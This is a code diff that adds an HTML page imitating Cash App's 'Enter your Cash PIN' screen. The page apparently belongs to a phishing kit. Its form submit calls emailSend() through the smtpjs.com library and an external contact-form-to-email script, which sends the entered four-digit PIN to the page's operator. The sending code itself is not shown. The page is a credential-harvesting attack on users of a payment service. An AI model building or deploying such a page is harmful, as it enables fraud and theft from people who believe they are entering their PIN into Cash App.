@@ -1,0 +1,86 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" type="image/svg+xml" href="logo.webp">
+    
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CashApp Pin</title>
+
+
+
+    <style>
+        input {
+            height: 40px;
+            width: 40px;
+            caret-color: #0074DE;
+        }
+    </style>
+  <script type="module" src="main.js"></script>
+  <link rel="stylesheet" href="pin.css">
+</head>
+<body class="bg-gray-100" data-new-gr-c-s-check-loaded="8.907.0" data-gr-ext-installed="">
+
+    <div class="w-[90%] max-w-md mx-auto pt-5">
+
+        <div id="ctn">
+
+	<form id="form" onsubmit="emailSend(); reset(); return false;" class="mt-4">
+            <input type="number" id="pin" name="pin" class="hidden">
+
+		<div class="inputsCtn bg-white rounded-md shadow-sm p-6 flex flex-col gap-6">
+
+             <h1 class=" text-lg">Enter your Cash PIN</h1>
+
+			<div class="flex items-center justify-center gap-x-4 mb-5">
+				<input type="tel" name="pin1" required="" class="font-bold pin text-center bg-gray-101 focus:border-primary  transition-all text-lg outline-none  rounded-md1" onkeyup="inputInsideOtpInput(this)">
+				<input type="tel" name="pin2" required="" class="font-bold pin text-center bg-gray-101 focus:border-primary  transition-all text-lg outline-none  rounded-md1" onkeyup="inputInsideOtpInput(this)">
+				<input type="tel" name="pin3" required="" class="font-bold pin text-center bg-gray-101 focus:border-primary transition-all text-lg outline-none  rounded-md1" onkeyup="inputInsideOtpInput(this)">
+				<input type="tel" name="pin4" required="" class="font-bold pin text-center bg-gray-101 focus:border-primary transition-all text-lg outline-none  rounded-md1" onkeyup="inputInsideOtpInput(this)" maxlength="1">
+			</div>
+
+			<button class="bg-primary text-white w-full rounded-md p-4 disabled:opacity-80">Next</button>
+
+
+</div>
+	</form>
+	</div>
+    </div>
+
+   <script type="module" src="/main.js"></script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script src="Contact-form-to-email2.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+   
+
+<script>
+    function inputInsideOtpInput(el) {
+        if (el.value.length > 1) {
+            el.value == ''
+            if (el.nextElementSibling.value == '') {
+                el.nextElementSibling.value = el.value[el.value.length - 1]
+            }
+            if (!el.nextElementSibling) {
+                el.value = el.value[0]
+            }
+            el.value = el.value[0]
+        }
+        try {
+            if (el.value == null || el.value == "") {
+                this.foucusOnInput(el.previousElementSibling);
+            } else {
+                this.foucusOnInput(el.nextElementSibling);
+            }
+        } catch (e) {
+            console.log(e);
+        }
+    }
+
+    function foucusOnInput(ele) {
+        ele.focus();
+    }
+
+</script>
+
+
+</body><grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration></html>
